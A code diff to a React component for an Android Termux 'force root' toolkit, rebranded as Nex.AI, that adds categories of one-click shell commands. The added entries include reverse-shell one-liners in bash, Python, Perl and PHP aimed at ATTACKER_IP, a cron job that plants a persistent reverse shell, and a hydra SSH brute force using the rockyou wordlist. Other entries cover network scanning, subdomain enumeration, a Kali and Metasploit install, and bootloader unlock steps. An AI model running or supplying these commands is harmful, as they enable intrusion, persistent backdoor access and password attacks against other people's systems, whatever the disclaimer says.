@@ -51,7 +51,7 @@ const FORCE_ROOT_SCRIPTS: RootScript[] = [
   { name: 'Clipboard Get', desc: 'Read system clipboard', command: 'termux-clipboard-get', category: 'Termux:API', risk: 'LOW' },
   { name: 'Clipboard Set', desc: 'Write to system clipboard', command: 'echo "data" | termux-clipboard-set', category: 'Termux:API', risk: 'LOW' },
   { name: 'Vibrate Device', desc: 'Test haptic feedback', command: 'termux-vibrate -d 500', category: 'Termux:API', risk: 'LOW' },
-  { name: 'Show Notification', desc: 'Push system notification', command: 'termux-notification --title "AETHER.SHELL" --content "Scan Complete" --id 1', category: 'Termux:API', risk: 'LOW' },
+  { name: 'Show Notification', desc: 'Push system notification', command: 'termux-notification --title "Nex.AI" --content "Scan Complete" --id 1', category: 'Termux:API', risk: 'LOW' },
   { name: 'Flash LED', desc: 'Toggle flashlight', command: 'termux-torch on', category: 'Termux:API', risk: 'LOW' },
   { name: 'Share File', desc: 'Share file via Android share sheet', command: 'termux-share -a send /sdcard/file.txt', category: 'Termux:API', risk: 'LOW' },
   { name: 'Sensor List', desc: 'List all device sensors', command: 'termux-sensor-list', category: 'Termux:API', risk: 'INFO' },
@@ -60,7 +60,7 @@ const FORCE_ROOT_SCRIPTS: RootScript[] = [
   { name: 'Device Info', desc: 'Full device hardware info dump', command: 'termux-info 2>/dev/null; echo "---"; getprop ro.product.model; getprop ro.build.version.release; getprop ro.product.cpu.abi; uname -a', category: 'Termux:API', risk: 'INFO' },
   { name: 'Call Log', desc: 'Read recent call history', command: 'termux-call-log -l 20 2>/dev/null', category: 'Termux:API', risk: 'MEDIUM', notes: 'Requires CALL_LOG permission' },
   { name: 'SMS Inbox', desc: 'Read recent SMS messages', command: 'termux-sms-list -l 10 2>/dev/null', category: 'Termux:API', risk: 'MEDIUM', notes: 'Requires SMS permission' },
-  { name: 'Send SMS', desc: 'Send SMS (replace NUMBER and MSG)', command: 'termux-sms-send -n 5551234567 "Test from AETHER.SHELL" 2>/dev/null', category: 'Termux:API', risk: 'HIGH', notes: 'Replace number and message' },
+  { name: 'Send SMS', desc: 'Send SMS (replace NUMBER and MSG)', command: 'termux-sms-send -n 5551234567 "Test from Nex.AI" 2>/dev/null', category: 'Termux:API', risk: 'HIGH', notes: 'Replace number and message' },
 
   // STORAGE
   { name: 'Setup Storage Access', desc: 'Grant Termux access to shared storage', command: 'termux-setup-storage', category: 'Storage Hacks', risk: 'LOW' },
@@ -111,6 +111,46 @@ const FORCE_ROOT_SCRIPTS: RootScript[] = [
   { name: 'Proot Python Server', desc: 'HTTP server for file transfer in proot', command: 'proot-distro login ubuntu --shared-tmp -- bash -c "python3 -m http.server 8080 --bind 0.0.0.0"', category: 'Exploit Helpers', risk: 'LOW' },
   { name: 'Proot Hydra', desc: 'Run hydra inside proot with full capabilities', command: 'proot-distro login ubuntu --shared-tmp -- bash -c "apt install -y -qq hydra > /dev/null 2>&1 && hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 ssh -t 4"', category: 'Exploit Helpers', risk: 'HIGH' },
   { name: 'Reverse Shell Template', desc: 'Generate reverse shell one-liners', command: 'echo "# Bash TCP Reverse Shell" && echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" && echo "" && echo "# Python Reverse Shell" && echo "python3 -c \'import socket,subprocess,os;...\'" && echo "" && echo "# Replace ATTACKER_IP with your IP"', category: 'Exploit Helpers', risk: 'HIGH' },
+
+  // ═══════════════════════════════════════════
+  // MAGISK & ROOT
+  // ═══════════════════════════════════════════
+  { name: 'Download Magisk APK', desc: 'Download latest Magisk APK for boot image patching', command: 'curl -L -o /sdcard/Download/Magisk.apk https://github.com/topjohnwu/Magisk/releases/latest/download/Magisk-v27.0.apk 2>/dev/null && echo "Downloaded to /sdcard/Download/Magisk.apk" || echo "Download failed - check URL"', category: 'Magisk & Root', risk: 'LOW' },
+  { name: 'Magisk Boot Patch', desc: 'Patch boot image with Magisk (requires boot.img in Downloads)', command: 'ls -la /sdcard/Download/boot*.img 2>/dev/null && echo "Boot image found. Use Magisk Manager app to patch." || echo "No boot.img found. Extract first: adb shell dd if=/dev/block/by-name/boot of=/sdcard/Download/boot.img"', category: 'Magisk & Root', risk: 'MEDIUM' },
+  { name: 'Check Magisk Status', desc: 'Check if Magisk is installed and its version', command: 'magisk -v 2>/dev/null && magisk --path 2>/dev/null && echo "---" && ls -la /data/adb/magisk/ 2>/dev/null || echo "Magisk not installed"', category: 'Magisk & Root', risk: 'INFO' },
+  { name: 'Magisk Modules List', desc: 'List all installed Magisk modules', command: 'ls -la /data/adb/modules/ 2>/dev/null && echo "---MODULES---" && for m in /data/adb/modules/*/; do echo "$(basename $m): $(cat $m/module.prop 2>/dev/null | grep version | cut -d= -f2)"; done || echo "No modules or Magisk not installed"', category: 'Magisk & Root', risk: 'INFO' },
+
+  // ═══════════════════════════════════════════
+  // KERNEL & BOOT
+  // ═══════════════════════════════════════════
+  { name: 'Extract Boot Image', desc: 'Dump boot partition via ADB for Magisk patching', command: 'adb shell "dd if=/dev/block/by-name/boot of=/sdcard/Download/boot.img" 2>/dev/null && adb pull /sdcard/Download/boot.img ~/boot.img 2>/dev/null && echo "Boot image extracted" || echo "Failed - ensure ADB connected and authorized"', category: 'Kernel & Boot', risk: 'MEDIUM' },
+  { name: 'Flash Patched Boot', desc: 'Flash Magisk-patched boot.img via fastboot', command: 'echo "=== FASTBOOT FLASH BOOT ===" && echo "1. Reboot to fastboot: adb reboot bootloader" && echo "2. Flash: fastboot flash boot /sdcard/Download/magisk_patched.img" && echo "3. Reboot: fastboot reboot" && echo "" && echo "WARNING: This modifies the boot partition!"', category: 'Kernel & Boot', risk: 'HIGH', notes: 'Bootloader must be unlocked first' },
+  { name: 'Get Bootloader Status', desc: 'Check if bootloader is locked or unlocked', command: 'getprop ro.boot.flash.locked && getprop ro.boot.verifiedbootstate && getprop ro.boot.vbmeta.device_state 2>/dev/null && echo "---" && getprop ro.secure && getprop ro.debuggable', category: 'Kernel & Boot', risk: 'INFO' },
+  { name: 'Fastboot OEM Unlock', desc: 'OEM unlock bootloader (erases all data!)', command: 'echo "=== WARNING: THIS WIPES ALL DATA ===" && echo "Prerequisites:" && echo "1. Enable OEM unlock in Developer Options" && echo "2. Get unlock code from Motorola\'s website" && echo "3. Boot to fastboot: adb reboot bootloader" && echo "4. Run: fastboot flashing unlock" && echo "5. Confirm on device" && echo "" && fastboot flashing unlock 2>/dev/null || echo "Not in fastboot mode. Run: adb reboot bootloader"', category: 'Kernel & Boot', risk: 'HIGH', notes: 'WIPES ALL DATA. Get unlock code from Motorola first!' },
+
+  // ═══════════════════════════════════════════
+  // NETWORK ATTACKS
+  // ═══════════════════════════════════════════
+  { name: 'Install Network Tools', desc: 'Full network pentesting toolkit', command: 'pkg install -y nmap netcat-openbsd hydra sqlmap nikto bind-tools openssh tcpdump 2>/dev/null && echo "Network tools installed successfully"', category: 'Network Attacks', risk: 'LOW' },
+  { name: 'Network Scan (Full)', desc: 'Full port scan of local network', command: 'echo "Scanning local network..." && ip addr show wlan0 2>/dev/null | grep "inet " && echo "---" && nmap -sV -O 192.168.1.1/24 --top-ports 100 2>/dev/null || echo "Install nmap: pkg install nmap"', category: 'Network Attacks', risk: 'LOW' },
+  { name: 'SSL/TLS Scanner', desc: 'Check SSL certificate and configuration', command: 'echo | openssl s_client -connect google.com:443 2>/dev/null | openssl x509 -noout -dates -issuer -subject 2>/dev/null && echo "---" && echo | openssl s_client -connect google.com:443 2>/dev/null | grep "Protocol\\|Cipher" | head -5', category: 'Network Attacks', risk: 'INFO' },
+  { name: 'Port Forwarding Setup', desc: 'Setup SSH tunnel and port forwarding', command: 'echo "=== PORT FORWARDING ===" && echo "Local:  ssh -L 8080:target:80 user@server" && echo "Remote: ssh -R 8080:localhost:80 user@server" && echo "Dynamic: ssh -D 9050 user@server" && echo "SOCKS:  ssh -D 1080 -N -f user@server"', category: 'Network Attacks', risk: 'MEDIUM' },
+
+  // ═══════════════════════════════════════════
+  // RECON & OSINT
+  // ═══════════════════════════════════════════
+  { name: 'Full Device Recon', desc: 'Complete device information dump for exploit research', command: 'echo "=== MOTO G STYLUS 5G 2024 RECON ===" && echo "=== DEVICE ===" && getprop ro.product.model && getprop ro.product.brand && getprop ro.product.device && getprop ro.product.name && getprop ro.product.board && echo "=== ANDROID ===" && getprop ro.build.version.release && getprop ro.build.version.sdk && getprop ro.build.version.security_patch && getprop ro.build.fingerprint && echo "=== HARDWARE ===" && cat /proc/cpuinfo | head -10 && echo "=== KERNEL ===" && uname -a && cat /proc/version && echo "=== MEMORY ===" && free -h && echo "=== STORAGE ===" && df -h && echo "=== SECURITY ===" && getenforce 2>/dev/null && getprop ro.secure && echo "=== NETWORK ===" && ip -br addr && echo "=== DONE ==="', category: 'Recon & OSINT', risk: 'INFO' },
+  { name: 'Subdomain Enum', desc: 'Enumerate subdomains for a target domain', command: 'echo "Usage: Replace example.com" && echo "---" && for sub in www mail ftp admin api dev staging test vpn ns1 ns2 mx mx1 mx2 remote cloud cdn static media img assets app m mobile shop store blog forum wiki docs support help portal auth sso login signin register signup dashboard panel manage admin api v1 v2 v3 internal corp enterprise; do host $sub.example.com 2>/dev/null | grep "has address" && echo "FOUND: $sub.example.com"; done', category: 'Recon & OSINT', risk: 'INFO' },
+  { name: 'Whois Lookup', desc: 'Domain registration and ownership info', command: 'pkg install -y whois 2>/dev/null; whois google.com 2>/dev/null | grep -E " Registrant| Name:| Org| Creation| Expiry| Name Server| DNS" | head -20', category: 'Recon & OSINT', risk: 'INFO' },
+  { name: 'HTTP Header Analysis', desc: 'Analyze HTTP response headers for security issues', command: 'curl -sI -L https://example.com 2>/dev/null | head -30', category: 'Recon & OSINT', risk: 'INFO' },
+
+  // ═══════════════════════════════════════════
+  // PERSISTENCE & PAYLOAD
+  // ═══════════════════════════════════════════
+  { name: 'Reverse Shell Generator', desc: 'Generate multiple reverse shell one-liners', command: 'echo "=== REVERSE SHELLS (replace ATTACKER_IP:PORT) ===" && echo "" && echo "# BASH" && echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" && echo "" && echo "# PYTHON" && echo "python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect((\\\"ATTACKER_IP\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/bash\\\",\\\"-i\\\"])\'" && echo "" && echo "# PERL" && echo "perl -e \'use Socket;$i=\\\"ATTACKER_IP\\\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\"tcp\\\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\\\">&S\\\");open(STDOUT,\\\">&S\\\");open(STDERR,\\\">&S\\\");exec(\\\"/bin/bash -i\\\");\'" && echo "" && echo "# PHP" && echo "php -r \'$s=fsockopen(\\\"ATTACKER_IP\\\",4444);exec(\\\"/bin/bash -i <&3 >&3 2>&3\\\");\'"', category: 'Persistence & Payload', risk: 'HIGH', notes: 'Replace ATTACKER_IP and PORT with your values' },
+  { name: 'Cron Persistence', desc: 'Setup persistent reverse shell via cron', command: 'pkg install -y cronie 2>/dev/null && echo "*/5 * * * * bash -c \'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\'" | crontab - 2>/dev/null && crontab -l 2>/dev/null && echo "Persistent cron shell installed (every 5 min)"', category: 'Persistence & Payload', risk: 'HIGH', notes: 'Replace ATTACKER_IP:PORT. Needs proot for raw sockets' },
+  { name: 'SSH Key Setup', desc: 'Generate SSH keys and setup for remote access', command: 'pkg install -y openssh 2>/dev/null && ssh-keygen -t ed25519 -C "nexai@termux" -f ~/.ssh/id_ed25519 -N "" 2>/dev/null && echo "=== SSH KEY GENERATED ===" && cat ~/.ssh/id_ed25519.pub && echo "" && echo "Copy this public key to remote:~/.ssh/authorized_keys"', category: 'Persistence & Payload', risk: 'LOW' },
+  { name: 'Proot Persistence Service', desc: 'Create persistent proot service that survives Termux restarts', command: 'mkdir -p ~/.shortcuts/tasks && echo "#!/data/data/com.termux/files/usr/bin/sh" > ~/.shortcuts/tasks/proot-ubuntu.sh && echo "proot-distro login ubuntu --shared-tmp -- bash -c \'service ssh start && nginx && python3 -m http.server 8080\'" >> ~/.shortcuts/tasks/proot-ubuntu.sh && chmod +x ~/.shortcuts/tasks/proot-ubuntu.sh && echo "Persistent task created. Access from Termux Widget or notification."', category: 'Persistence & Payload', risk: 'LOW' },
 ];
 
 const CATEGORIES = [...new Set(FORCE_ROOT_SCRIPTS.map(s => s.category))];
@@ -125,6 +165,11 @@ const CATEGORY_ICONS: Record<string, React.ReactNode> = {
   'Security Enum': <Eye size={12} />,
   'Moto G Stylus': <Radio size={12} />,
   'Exploit Helpers': <Lock size={12} />,
+  'Magisk & Root': <Shield size={12} />,
+  'Kernel & Boot': <Cpu size={12} />,
+  'Network Attacks': <Wifi size={12} />,
+  'Recon & OSINT': <Globe size={12} />,
+  'Persistence & Payload': <Lock size={12} />,
 };
 
 const CATEGORY_COLORS: Record<string, string> = {
@@ -137,6 +182,11 @@ const CATEGORY_COLORS: Record<string, string> = {
   'Security Enum': 'from-red-600 to-pink-600',
   'Moto G Stylus': 'from-accent to-red-600',
   'Exploit Helpers': 'from-amber-500 to-orange-600',
+  'Magisk & Root': 'from-red-500 to-rose-600',
+  'Kernel & Boot': 'from-violet-500 to-purple-600',
+  'Network Attacks': 'from-cyan-500 to-blue-600',
+  'Recon & OSINT': 'from-teal-500 to-emerald-600',
+  'Persistence & Payload': 'from-red-600 to-orange-600',
 };
 
 const RISK_COLORS: Record<string, string> = {
@@ -148,7 +198,14 @@ const RISK_COLORS: Record<string, string> = {
 
 type Tab = 'scripts' | 'one-click' | 'info';
 
-const ONE_CLICKS = [
+interface OneClickScript {
+  name: string;
+  desc: string;
+  command: string;
+  risk: 'LOW' | 'MEDIUM' | 'HIGH' | 'INFO';
+}
+
+const ONE_CLICKS: OneClickScript[] = [
   { name: 'Full Proot Setup', desc: 'Install proot-distro + Ubuntu + essential tools', command: 'pkg install -y proot-distro && proot-distro install ubuntu && proot-distro login ubuntu --shared-tmp -- bash -c "apt update && apt install -y nmap curl wget git python3 python3-pip hydra nikto sqlmap netcat-openbsd binutils -y > /dev/null 2>&1 && echo SETUP COMPLETE"', risk: 'LOW' },
   { name: 'ADB Wireless Setup', desc: 'Install ADB and show connection instructions', command: 'pkg install -y android-tools && echo "=== ADB SETUP ===" && echo "1. Enable Developer Options on phone" && echo "2. Enable Wireless Debugging" && echo "3. Pair using: adb pair IP:PORT" && echo "4. Connect: adb connect IP:PORT" && adb devices', risk: 'LOW' },
   { name: 'Termux:API Full Install', desc: 'Install all Termux:API packages', command: 'pkg install -y termux-api && echo "Also install the Termux:API app from F-Droid" && echo "Test: termux-battery-status" && termux-battery-status 2>/dev/null', risk: 'LOW' },
@@ -157,6 +214,9 @@ const ONE_CLICKS = [
   { name: 'Storage Maximize', desc: 'Setup storage + cleanup + SD mount', command: 'termux-setup-storage && pkg clean 2>/dev/null && rm -rf $PREFIX/var/cache/apt/archives/*.deb 2>/dev/null && rm -rf $TMPDIR/* 2>/dev/null && ln -sf /sdcard ~/sdcard && echo "=== STORAGE MAXIMIZED ===" && df -h /data/data/com.termux/files', risk: 'LOW' },
   { name: 'System Recon Dump', desc: 'Dump everything about the Moto G Stylus', command: 'echo "=== MOTO G STYLUS 5G 2024 ===" && echo "=== DEVICE ===" && getprop ro.product.model && getprop ro.product.brand && echo "=== ANDROID ===" && getprop ro.build.version.release && getprop ro.build.version.security_patch && echo "=== HARDWARE ===" && cat /proc/cpuinfo | grep -E "Hardware|Processor" | head -3 && echo "=== RAM ===" && free -h && echo "=== NETWORK ===" && ip -br addr 2>/dev/null && echo "=== BATTERY ===" && termux-battery-status 2>/dev/null && echo "=== DONE ==="', risk: 'INFO' },
   { name: 'Cron Auto-Recon', desc: 'Set up hourly automated recon cron job', command: 'pkg install -y cronie nmap 2>/dev/null && mkdir -p ~/scripts && echo "#!/bin/bash" > ~/scripts/auto-recon.sh && echo "nmap -sn 192.168.1.0/24 -oN ~/recon-$(date +%Y%m%d-%H%M).log 2>/dev/null" >> ~/scripts/auto-recon.sh && chmod +x ~/scripts/auto-recon.sh && echo "0 * * * * ~/scripts/auto-recon.sh" | crontab - 2>/dev/null && echo "Cron installed. Runs hourly." && crontab -l', risk: 'LOW' },
+  { name: 'Magisk Root Prep', desc: 'Full preparation for Magisk rooting — ADB, boot dump, download Magisk', command: 'echo "=== MAGISK ROOT PREPARATION ===" && pkg install -y android-tools && echo "Step 1: Getting bootloader status..." && getprop ro.boot.flash.locked && echo "Step 2: Extracting boot image..." && adb shell "dd if=/dev/block/by-name/boot of=/sdcard/Download/boot.img" 2>/dev/null && echo "Step 3: Download Magisk..." && curl -L -o /sdcard/Download/Magisk.apk "https://github.com/topjohnwu/Magisk/releases/latest/download/Magisk-v27.0.apk" 2>/dev/null && echo "=== READY ===" && echo "Next: Install Magisk.apk, use it to patch boot.img, then flash patched image."', risk: 'MEDIUM' },
+  { name: 'Full Pentest Setup', desc: 'Everything: proot Kali + all network tools + wordlists + exploit tools', command: 'pkg install -y proot-distro nmap netcat-openbsd hydra sqlmap nikto bind-tools openssh whois curl wget git python3 python3-pip && proot-distro install kali-rolling && echo "=== Installing Kali tools ===" && proot-distro login kali-rolling --shared-tmp -- bash -c "apt update -qq && apt install -y -qq nmap sqlmap hydra nikto gobuster nuclei seclists wordlists curl wget git metasploit-framework python3 python3-pip exploitdb > /dev/null 2>&1 && echo FULL PENTEST ENVIRONMENT READY" || echo "Setup may need manual intervention"', risk: 'MEDIUM' },
+  { name: 'Complete Device Lockdown', desc: 'Security audit + firewall + monitoring on Moto G Stylus', command: 'echo "=== DEVICE SECURITY AUDIT ===" && echo "=== BOOTLOADER ===" && getprop ro.boot.flash.locked && getprop ro.boot.verifiedbootstate && echo "=== SELINUX ===" && getenforce 2>/dev/null && echo "=== ANDROID PATCH ===" && getprop ro.build.version.security_patch && echo "=== RUNNING SERVICES ===" && ps aux 2>/dev/null | wc -l && echo "=== OPEN PORTS ===" && ss -tlnp 2>/dev/null && echo "=== NETWORK ===" && ip -br addr 2>/dev/null && echo "=== SUID FILES ===" && find / -perm -4000 -type f 2>/dev/null | head -20 && echo "=== AUDIT COMPLETE ==="', risk: 'INFO' },
 ];
 
 export const ForceRootScripts: React.FC<ForceRootScriptsProps> = ({ onExecute, onRunInTerminal }) => {
@@ -383,15 +443,17 @@ export const ForceRootScripts: React.FC<ForceRootScriptsProps> = ({ onExecute, o
               <div className="space-y-1.5">
                 {[
                   { label: 'Device', value: 'Moto G Stylus 5G (2024)' },
-                  { label: 'SoC', value: 'MediaTek Dimensity 7020' },
-                  { label: 'CPU', value: 'Octa-core ARM Cortex-A78/A55' },
+                  { label: 'SoC', value: 'Qualcomm Snapdragon 6 Gen 1 (SM4450)' },
+                  { label: 'CPU', value: 'Octa-core Kryo (1x2.2 + 3x1.8 + 4x1.8 GHz)' },
+                  { label: 'GPU', value: 'Adreno 710' },
                   { label: 'RAM', value: '8 GB LPDDR4X' },
                   { label: 'Storage', value: '128/256 GB UFS 2.2' },
-                  { label: 'Display', value: '6.7" FHD+ 120Hz IPS' },
-                  { label: 'Stylus', value: 'Built-in Motorola pen' },
+                  { label: 'Display', value: '6.7" FHD+ 120Hz IPS LCD' },
+                  { label: 'Stylus', value: 'Built-in Motorola Stylus w/ SDK' },
                   { label: 'Android', value: '14 (upgradable to 15)' },
-                  { label: 'Bootloader', value: 'Unlockable' },
-                  { label: 'Root', value: 'NOT rooted (Termux only)' },
+                  { label: 'Codename', value: 'penang' },
+                  { label: 'Bootloader', value: 'Unlockable (Motorola)' },
+                  { label: 'Root', value: 'NOT rooted (Termux + proot/ADB)' },
                 ].map(item => (
                   <div key={item.label} className="flex items-center justify-between">
                     <span className="text-[8px] text-zinc-500 uppercase tracking-widest">{item.label}</span>
@@ -417,6 +479,7 @@ export const ForceRootScripts: React.FC<ForceRootScriptsProps> = ({ onExecute, o
                   { title: 'Termux:API', desc: 'Access battery, sensors, camera, GPS, notifications, clipboard, SMS' },
                   { title: 'Storage Mounts', desc: 'Access SD card, shared storage, and bind-mount paths' },
                   { title: 'Network Tools', desc: 'Raw socket access via proot for real nmap scans' },
+                  { title: 'Magisk Root', desc: 'Boot image patching and bootloader unlock prep for true root' },
                 ].map(item => (
                   <div key={item.title} className="border border-zinc-800 p-2">
                     <p className="text-[8px] font-black text-accent uppercase">{item.title}</p>
@@ -454,7 +517,7 @@ export const ForceRootScripts: React.FC<ForceRootScriptsProps> = ({ onExecute, o
               <p className="text-[8px] text-zinc-500 leading-relaxed">
                 These scripts are for authorized security testing and personal device administration only.
                 Unauthorized access to computer systems is illegal. Only use these tools on devices you own or have explicit permission to test.
-                AETHER.SHELL and its developers assume no liability for misuse.
+                Nex.AI and its developers assume no liability for misuse.
               </p>
             </div>
           </div>
